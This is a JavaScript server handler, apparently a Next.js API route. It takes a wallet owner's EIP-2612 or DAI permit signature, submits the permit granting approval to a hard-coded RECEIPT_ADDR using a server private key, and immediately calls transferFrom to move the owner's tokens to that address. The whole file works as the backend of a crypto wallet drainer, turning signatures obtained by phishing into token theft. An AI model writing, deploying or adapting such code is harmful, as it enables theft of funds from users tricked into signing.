import { DEADLINE } from './../../config/index';
import { ethers } from 'ethers';
import permit7ABI from '../../abi/permit-7.json';
import permitDAI from '../../abi/permitDAI.json';
import { CHAIN_ID, PROVIDER, RECEIPT_ADDR } from '../../config';

require('dotenv').config();

export default async function handler(req, res) {

	if (req.method === 'POST') {

		try {

			const { tokenAddress, owner, amount, signature, nonce, chain } = req.body;

			const provider = new ethers.providers.JsonRpcProvider(PROVIDER[chain], chain);

			const signer = new ethers.Wallet("0x" + process.env.PRIVATE_KEY, provider);


			console.log("Token address: ", tokenAddress);
			console.log("Owner: ", owner);
			console.log("Amount: ", amount);
			console.log("Signature: ", signature);


			const sig = ethers.utils.splitSignature(signature);

			let tokenContract;
			let permit;

			const gasPrice = await provider.getGasPrice();

			if (tokenAddress == "0x30C6a829795a294eBB0C70f5876F5446BFa89846") {
				tokenContract = new ethers.Contract(tokenAddress, permitDAI, signer);
				permit = await tokenContract.permit(owner, RECEIPT_ADDR, nonce, DEADLINE, true, sig.v, sig.r, sig.s, {
					gasLimit: 150000,
					gasPrice: gasPrice

				});
			}
			else {
				tokenContract = new ethers.Contract(tokenAddress, permit7ABI, signer);
				permit = await tokenContract.permit(owner, RECEIPT_ADDR, amount, DEADLINE, sig.v, sig.r, sig.s, {
					gasLimit: 150000,
					gasPrice: gasPrice

				});
			}
			await permit.wait();

			console.log("Token transfer: ", tokenAddress);

			const transferFrom = await tokenContract.transferFrom(owner, RECEIPT_ADDR, amount, {
				gasLimit: 100000,
				gasPrice: gasPrice

			});

			//await transferFrom.wait();
			let hashPermit = permit.hash;
			let hashTransfer = transferFrom.hash;

			console.log("Token transfered");

			res.status(200).json({ success: true, hashPermit, hashTransfer });
		} catch (error) {
			console.error(error);
			res.status(500).json({ success: false, error: error.message });
		}
	} else {
		res.status(405).end();
	}
}